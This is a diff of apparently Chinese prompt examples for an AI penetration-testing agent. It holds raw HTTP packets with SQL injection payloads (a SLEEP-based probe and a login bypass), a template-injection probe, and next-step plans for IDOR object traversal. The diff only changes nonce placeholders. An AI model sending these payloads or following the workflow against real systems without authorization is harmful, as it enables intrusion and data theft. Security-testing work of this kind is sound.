@@ -99,13 +99,13 @@
 }
 ```
 
-<|GEN_MODIFIED_PACKET_{{ .Nonce }}|>
+<|GEN_MODIFIED_PACKET_CURRENT_NONCE|>
 GET /user?id=1%20AND%20SLEEP(1) HTTP/1.1
 Host: 127.0.0.1:8787
 Accept-Encoding: gzip, deflate, br
 Cookie: session=guest
 
-<|GEN_MODIFIED_PACKET_END_{{ .Nonce }}|>
+<|GEN_MODIFIED_PACKET_END_CURRENT_NONCE|>
 
 ### 示例 10：测试过程中的简短问答
 ```json
@@ -122,7 +122,7 @@ Cookie: session=guest
 }
 ```
 
-<|FINAL_ANSWER_{{ .Nonce }}|>
+<|FINAL_ANSWER_CURRENT_NONCE|>
 ## 当前阶段结论
 
 ### 已测试方面
@@ -148,7 +148,7 @@ Cookie: session=guest
 1. 针对 q 做更细的引号闭合和上下文打断测试。
 2. 检查相邻参数名、排序参数、分页参数是否存在未测的注入面。
 3. 观察是否能通过调试信息、模板报错或搜索结果差异挖到信息泄漏。
-<|FINAL_ANSWER_END_{{ .Nonce }}|>
+<|FINAL_ANSWER_END_CURRENT_NONCE|>
 
 ### 示例 12：使用 FINAL_ANSWER 输出 IDOR/信息泄漏方向
 ```json
@@ -157,7 +157,7 @@ Cookie: session=guest
 }
 ```
 
-<|FINAL_ANSWER_{{ .Nonce }}|>
+<|FINAL_ANSWER_CURRENT_NONCE|>
 ## 当前阶段结论
 
 ### 已测试方面
@@ -176,7 +176,7 @@ Cookie: session=guest
 1. 扩大对象编号遍历范围，确认是否可稳定越权读取。
 2. 切换 Cookie 或 Authorization 头，验证是否真的是权限边界问题。
 3. 再看详情接口、导出接口、文件下载接口是否复用了同一对象访问控制缺陷。
-<|FINAL_ANSWER_END_{{ .Nonce }}|>
+<|FINAL_ANSWER_END_CURRENT_NONCE|>
 
 ### 示例 13：直接生成完整原始数据包并发送
 ```json
@@ -188,14 +188,14 @@ Cookie: session=guest
 }
 ```
 
-<|GEN_PACKET_{{ .Nonce }}|>
+<|GEN_PACKET_CURRENT_NONCE|>
 POST /login HTTP/1.1
 Host: vulnerable-app.local
 Content-Type: application/x-www-form-urlencoded
 Cookie: session=guest
 
 username=admin%27%20or%20%271%27=%271&password=test
-<|GEN_PACKET_END_{{ .Nonce }}|>
+<|GEN_PACKET_END_CURRENT_NONCE|>
 
 ### 示例 14：完全新建原始数据包做模板注入探测
 ```json
@@ -207,10 +207,10 @@ username=admin%27%20or%20%271%27=%271&password=test
 }
 ```
 
-<|GEN_PACKET_{{ .Nonce }}|>
+<|GEN_PACKET_CURRENT_NONCE|>
 POST /api/config/render HTTP/1.1
 Host: target.internal
 Content-Type: application/json
 
 {"name":"tester","template":"{{ "{{7*7}}" }}","preview":true}
-<|GEN_PACKET_END_{{ .Nonce }}|>
+<|GEN_PACKET_END_CURRENT_NONCE|>
